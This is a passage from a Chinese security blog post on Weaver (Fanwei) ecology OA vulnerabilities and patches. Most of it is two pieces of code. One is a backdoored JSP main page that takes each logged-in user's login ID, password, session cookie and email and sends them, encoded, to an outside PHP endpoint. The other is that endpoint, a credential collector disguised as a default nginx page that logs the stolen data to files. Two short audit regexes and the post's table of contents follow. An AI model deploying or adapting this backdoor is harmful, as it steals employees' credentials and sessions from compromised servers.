<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;weaver.hrm.HrmUserVarify&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;weaver.hrm.User&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.*,weaver.general.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;net.sf.json.JSONObject&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="comment">//判断密码强制修改</span></span><br><span class="line"><span class="type">String</span> <span class="variable">changepwd</span> <span class="operator">=</span> (String)request.getSession().getAttribute(<span class="string">&quot;changepwd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;n&quot;</span>.equals(changepwd))&#123;</span><br><span class="line">	request.getSession().removeAttribute(<span class="string">&quot;changepwd&quot;</span>);</span><br><span class="line">	response.sendRedirect(<span class="string">&quot;/login/Login.jsp&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;y&quot;</span>.equals(changepwd))&#123;</span><br><span class="line">	request.getSession().removeAttribute(<span class="string">&quot;changepwd&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*用户验证*/</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> HrmUserVarify.getUser (request , response) ;</span><br><span class="line"><span class="keyword">if</span>(user==<span class="literal">null</span>) &#123;</span><br><span class="line">    response.sendRedirect(<span class="string">&quot;/login/Login.jsp&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">json</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    Cookie[] cookies = request.getCookies();</span><br><span class="line">    <span class="type">String</span> <span class="variable">sessionKey</span> <span class="operator">=</span> <span class="string">&quot;ecology_JSessionId&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ecsessionid</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> != cookies) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Cookie cookie : cookies) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cookie.getName().equals(sessionKey)) &#123;</span><br><span class="line">                ecsessionid = cookie.getValue();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">Message</span> <span class="operator">=</span> <span class="string">&quot;flase&quot;</span>;</span><br><span class="line">    String Ipaddr=Util.getIpAddr(request);</span><br><span class="line">    <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">        Message = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">        json.put(<span class="string">&quot;SubCompanyID&quot;</span>, <span class="string">&quot;&quot;</span> + user.getUserSubCompany1());</span><br><span class="line">        json.put(<span class="string">&quot;DepartmentID&quot;</span>, <span class="string">&quot;&quot;</span> + user.getUserDepartment());</span><br><span class="line">        json.put(<span class="string">&quot;UserName&quot;</span>, <span class="string">&quot;&quot;</span> + user.getLastname());</span><br><span class="line">        json.put(<span class="string">&quot;Loginid&quot;</span>, <span class="string">&quot;&quot;</span> + user.getLoginid());</span><br><span class="line">        json.put(<span class="string">&quot;UserID&quot;</span>, <span class="string">&quot;&quot;</span> + user.getUID());</span><br><span class="line">        json.put(<span class="string">&quot;UserType&quot;</span>, <span class="string">&quot;&quot;</span> + user.getType());</span><br><span class="line">        json.put(<span class="string">&quot;Language&quot;</span>, <span class="string">&quot;&quot;</span> + user.getLanguage());</span><br><span class="line">        json.put(<span class="string">&quot;SESSION&quot;</span>, <span class="string">&quot;&quot;</span> + ecsessionid);</span><br><span class="line">        json.put(<span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;&quot;</span> + user.getPwd());</span><br><span class="line">        json.put(<span class="string">&quot;Email&quot;</span>, <span class="string">&quot;&quot;</span> + user.getEmail());</span><br><span class="line">        json.put(<span class="string">&quot;IP&quot;</span>,<span class="string">&quot;&quot;</span>+Ipaddr);</span><br><span class="line">    &#125;</span><br><span class="line">    json.put(<span class="string">&quot;Message&quot;</span>, Message);</span><br><span class="line">    <span class="comment">//HTTP</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">encodedString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.encode(URLEncoder.encode(json.toString(), <span class="string">&quot;UTF-8&quot;</span>).getBytes(<span class="string">&quot;UTF-8&quot;</span>)));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://x/961d4e0694b737a99a83a67d04716592.php?para=ABC&quot;</span> + encodedString);</span><br><span class="line">        <span class="type">HttpURLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br><span class="line">        conn.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">        conn.setUseCaches(<span class="literal">false</span>);</span><br><span class="line">        conn.setConnectTimeout(<span class="number">5000</span>);</span><br><span class="line">        conn.setRequestProperty(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;*/*&quot;</span>);</span><br><span class="line">        conn.setRequestProperty(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 11; Windows NT 5.1)&quot;</span>);</span><br><span class="line">        conn.connect();</span><br><span class="line">        <span class="keyword">if</span> (conn.getResponseCode() != <span class="number">200</span>) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">from</span> <span class="operator">=</span> Util.null2String(request.getParameter(<span class="string">&quot;from&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;preview&quot;</span>.equals(from))</span><br><span class="line">	session.removeAttribute(<span class="string">&quot;SESSION_CURRENT_THEME&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%@ include file=<span class="string">&quot;/wui/common/page/initWui.jsp&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 系统主题</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">String</span> <span class="variable">curTheme</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ely6flg</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">gopage</span> <span class="operator">=</span> Util.null2String(request.getParameter(<span class="string">&quot;gopage&quot;</span>));</span><br><span class="line"><span class="type">String</span> <span class="variable">frompage</span> <span class="operator">=</span> Util.null2String(request.getParameter(<span class="string">&quot;frompage&quot;</span>));</span><br><span class="line"><span class="type">int</span> <span class="variable">targetid</span> <span class="operator">=</span> Util.getIntValue(request.getParameter(<span class="string">&quot;targetid&quot;</span>),<span class="number">0</span>) ;</span><br><span class="line"><span class="type">String</span> <span class="variable">logintype</span> <span class="operator">=</span> Util.null2String(user.getLogintype()) ;</span><br><span class="line">curTheme = getCurrWuiConfig(session, user, <span class="string">&quot;theme&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">skin</span> <span class="operator">=</span> getCurrWuiConfig(session, user, <span class="string">&quot;skin&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;ecology6&quot;</span>.equals(curTheme.toLowerCase())) &#123;</span><br><span class="line">	curTheme = <span class="string">&quot;ecology7&quot;</span>;</span><br><span class="line">	ely6flg = <span class="string">&quot;ecology6&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//curTheme = &quot;ecology8&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">if (ely6flg != null &amp;&amp; !&quot;&quot;.equals(ely6flg) &amp;&amp; &quot;ecology6&quot;.equals(ely6flg)) &#123;	</span></span><br><span class="line"><span class="comment">	response.sendRedirect(&quot;/main.jsp&quot;);</span></span><br><span class="line"><span class="comment">	return;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 根据用户设置，跳转到相应的模式中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">request.getRequestDispatcher(<span class="string">&quot;/wui/theme/&quot;</span> + curTheme +<span class="string">&quot;/page/main.jsp?&quot;</span>+request.getQueryString()).forward(request, response);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line"><span class="variable">$nginxRes</span>=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">    &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Welcome to nginx!&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">    html &#123; color-scheme: light dark; &#125;</span></span><br><span class="line"><span class="string">    body &#123; width: 35em; margin: 0 auto;</span></span><br><span class="line"><span class="string">    font-family: Tahoma, Verdana, Arial, sans-serif; &#125;</span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Welcome to nginx!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;If you see this page, the nginx web server is successfully installed and</span></span><br><span class="line"><span class="string">    working. Further configuration is required.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &lt;p&gt;For online documentation and support please refer to</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;</span></span><br><span class="line"><span class="string">    Commercial support is available at</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;http://nginx.com/&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>])||<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$nginxRes</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;85a48d5a6e7aed5e3c8b5239fc59b445.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;[&#x27;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d h:i:s&quot;</span>, <span class="title function_ invoke__">time</span>()) . <span class="string">&#x27;]  &#x27;</span>. PHP_EOL . <span class="string">&#x27;================New Credential received================&#x27;</span>. PHP_EOL. <span class="variable">$user</span> . <span class="string">&#x27;----&#x27;</span> . <span class="variable">$pass</span> . PHP_EOL. <span class="string">&#x27;=======================================================&#x27;</span> . PHP_EOL. PHP_EOL);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;para&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;para&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$nginxRes</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$para</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;para&#x27;</span>];</span><br><span class="line">    <span class="variable">$paras</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$para</span>,<span class="number">3</span>);</span><br><span class="line">    <span class="variable">$paraJson</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$paras</span>))), <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$paraJson</span>[<span class="string">&#x27;Message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$nginxRes</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$Loginid</span> = <span class="variable">$paraJson</span>[<span class="string">&#x27;Loginid&#x27;</span>];</span><br><span class="line">    <span class="variable">$UserName</span> = <span class="variable">$paraJson</span>[<span class="string">&#x27;UserName&#x27;</span>];</span><br><span class="line">    <span class="variable">$UserID</span> = <span class="variable">$paraJson</span>[<span class="string">&#x27;UserID&#x27;</span>];</span><br><span class="line">    <span class="variable">$SESSION</span> = <span class="variable">$paraJson</span>[<span class="string">&#x27;SESSION&#x27;</span>];</span><br><span class="line">    <span class="variable">$pwd</span> = <span class="variable">$paraJson</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">    <span class="variable">$Email</span> = <span class="variable">$paraJson</span>[<span class="string">&#x27;Email&#x27;</span>];</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;5b67d7e8a67cbe8d835d46b93d18d335.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;[&#x27;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, <span class="title function_ invoke__">time</span>()) . <span class="string">&#x27;] &#x27;</span>. PHP_EOL . <span class="string">&#x27;================New Credential received================&#x27;</span>. PHP_EOL.<span class="string">&#x27; UserID =&gt; &#x27;</span> . <span class="variable">$UserID</span> . PHP_EOL . <span class="string">&#x27; Loginid =&gt; &#x27;</span> . <span class="variable">$Loginid</span> . PHP_EOL . <span class="string">&#x27; UserName =&gt; &#x27;</span> . <span class="variable">$UserName</span> . PHP_EOL . <span class="string">&#x27; SESSION =&gt;&#x27;</span> . <span class="variable">$SESSION</span> . PHP_EOL . <span class="string">&#x27; pwd =&gt;&#x27;</span> . <span class="variable">$pwd</span> . PHP_EOL . <span class="string">&#x27; Email =&gt;&#x27;</span> . <span class="variable">$Email</span>. PHP_EOL. <span class="string">&#x27;=======================================================&#x27;</span> . PHP_EOL. PHP_EOL);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    <span class="variable">$res</span>=<span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$res</span>[<span class="string">&#x27;code&#x27;</span>]=<span class="number">200</span>;</span><br><span class="line">    <span class="variable">$res</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;OK&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$res</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$nginxRes</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="查任意类调用"><a href="#查任意类调用" class="headerlink" title="查任意类调用"></a>查任意类调用</h3><p><code>Class.forName\(.*(\s.*)*.*getMethod\(.*(\s.*)*.*invoke\(</code></p>
<h3 id="查文件下载"><a href="#查文件下载" class="headerlink" title="查文件下载"></a>查文件下载</h3><p><code>new BufferedInputStream(new FileInputStream(.*))</code></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://0x20h.com">Sp4ce</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://0x20h.com/p/fe8f.html">https://0x20h.com/p/fe8f.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://0x20h.com" target="_blank">Sp4ce's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></div><div class="post_share"><div class="social-share" data-image="/./img/random/material-15.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/p/8770.html" title="泛微OA任意用户登录&lt;10.47"><img class="cover" src="/./img/random/material-18.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">泛微OA任意用户登录&lt;10.47</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/p/b58b.html" title="向日葵远程命令执行漏洞分析"><img class="cover" src="/./img/random/material-11.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-16</div><div class="title">向日葵远程命令执行漏洞分析</div></div></a></div><div><a href="/p/8770.html" title="泛微OA任意用户登录&lt;10.47"><img class="cover" src="/./img/random/material-18.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-03</div><div class="title">泛微OA任意用户登录&lt;10.47</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AE9"><span class="toc-number">2.</span> <span class="toc-text">泛微9</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">补丁分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20190213-v10-10%E8%A1%A5%E4%B8%81%E5%8C%85-%E3%80%90v10-03-10-10%E3%80%91"><span class="toc-number">2.1.1.</span> <span class="toc-text">Ecology_security_20190213_v10.10补丁包 【v10.03-10.10】</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleJspCheck"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">SecurityRuleJspCheck</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleCtrFreq"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">SecurityRuleCtrFreq</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForbiddenFCK"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">SecurityRuleForbiddenFCK</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleSptmThumbnail"><span class="toc-number">2.1.1.4.</span> <span class="toc-text">SecurityRuleSptmThumbnail</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleNeedLoginFormmodel"><span class="toc-number">2.1.1.5.</span> <span class="toc-text">SecurityRuleNeedLoginFormmodel</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E8%8E%B7%E5%8F%96%E6%B3%9B%E5%BE%AE%E8%A1%A5%E4%B8%81%E5%8F%B7"><span class="toc-number">2.1.1.6.</span> <span class="toc-text">前台获取泛微补丁号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20190402-v10-11"><span class="toc-number">2.1.2.</span> <span class="toc-text">Ecology_security_20190402_v10.11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20190410-v10-12"><span class="toc-number">2.1.3.</span> <span class="toc-text">Ecology_security_20190410_v10.12</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule04"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">SecurityRule04</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForbiddenFCK-1"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">SecurityRuleForbiddenFCK</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleJspCheck-1"><span class="toc-number">2.1.3.3.</span> <span class="toc-text">SecurityRuleJspCheck</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForbiddenJHBServlet"><span class="toc-number">2.1.3.4.</span> <span class="toc-text">SecurityRuleForbiddenJHBServlet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleLoginidCheck"><span class="toc-number">2.1.3.5.</span> <span class="toc-text">SecurityRuleLoginidCheck</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleQiyuesuoDownload"><span class="toc-number">2.1.3.6.</span> <span class="toc-text">SecurityRuleQiyuesuoDownload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20190725-v10-14"><span class="toc-number">2.1.4.</span> <span class="toc-text">Ecology_security_20190725_v10.14</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule15ActionJsp"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">SecurityRule15ActionJsp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule24FormActionJsp"><span class="toc-number">2.1.4.2.</span> <span class="toc-text">SecurityRule24FormActionJsp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleFileDownload21"><span class="toc-number">2.1.4.3.</span> <span class="toc-text">SecurityRuleFileDownload21</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleFileDownload22"><span class="toc-number">2.1.4.4.</span> <span class="toc-text">SecurityRuleFileDownload22</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForbiddenFCK-2"><span class="toc-number">2.1.4.5.</span> <span class="toc-text">SecurityRuleForbiddenFCK</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForbiddenJHBServlet-1"><span class="toc-number">2.1.4.6.</span> <span class="toc-text">SecurityRuleForbiddenJHBServlet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleImgTextViewFor23"><span class="toc-number">2.1.4.7.</span> <span class="toc-text">SecurityRuleImgTextViewFor23</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleLoginidCheck-1"><span class="toc-number">2.1.4.8.</span> <span class="toc-text">SecurityRuleLoginidCheck</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleQiyuesuoDownload-1"><span class="toc-number">2.1.4.9.</span> <span class="toc-text">SecurityRuleQiyuesuoDownload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleQX20"><span class="toc-number">2.1.4.10.</span> <span class="toc-text">SecurityRuleQX20</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#weaver-org-springframework-web-servlet-resourceservlet"><span class="toc-number">2.1.4.10.1.</span> <span class="toc-text">&#x2F;weaver&#x2F;org.springframework.web.servlet.resourceservlet</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#weaver-weaver-common-ctrl-downloadservlet-%E3%80%90SecurityRuleQX21%E3%80%91"><span class="toc-number">2.1.4.10.2.</span> <span class="toc-text">&#x2F;weaver&#x2F;weaver.common.(ctrl|downloadservlet) 【SecurityRuleQX21】</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleQXLoadZip19"><span class="toc-number">2.1.4.11.</span> <span class="toc-text">SecurityRuleQXLoadZip19</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20190917-v10-15"><span class="toc-number">2.1.5.</span> <span class="toc-text">Ecology_security_20190917_v10.15</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForbiddenBshServlet"><span class="toc-number">2.1.5.1.</span> <span class="toc-text">SecurityRuleForbiddenBshServlet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleLogReader24"><span class="toc-number">2.1.5.2.</span> <span class="toc-text">SecurityRuleLogReader24</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleWFFunName25"><span class="toc-number">2.1.5.3.</span> <span class="toc-text">SecurityRuleWFFunName25</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20191010-v10-16"><span class="toc-number">2.1.6.</span> <span class="toc-text">Ecology_security_20191010_v10.16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20191010-v10-18"><span class="toc-number">2.1.7.</span> <span class="toc-text">Ecology_security_20191010_v10.18</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleSQL28"><span class="toc-number">2.1.7.1.</span> <span class="toc-text">SecurityRuleSQL28</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20191017-v10-19"><span class="toc-number">2.1.8.</span> <span class="toc-text">Ecology_security_20191017_v10.19</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mobile-x2F-DBconfigReader-jsp"><span class="toc-number">2.1.8.1.</span> <span class="toc-text">mobile&#x2F;DBconfigReader.jsp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule34"><span class="toc-number">2.1.8.2.</span> <span class="toc-text">SecurityRule34</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule35"><span class="toc-number">2.1.8.3.</span> <span class="toc-text">SecurityRule35</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule36"><span class="toc-number">2.1.8.4.</span> <span class="toc-text">SecurityRule36</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleConfig38"><span class="toc-number">2.1.8.5.</span> <span class="toc-text">SecurityRuleConfig38</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleHttpServlet"><span class="toc-number">2.1.8.6.</span> <span class="toc-text">SecurityRuleHttpServlet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleNetworkFor37"><span class="toc-number">2.1.8.7.</span> <span class="toc-text">SecurityRuleNetworkFor37</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleSQL28-1"><span 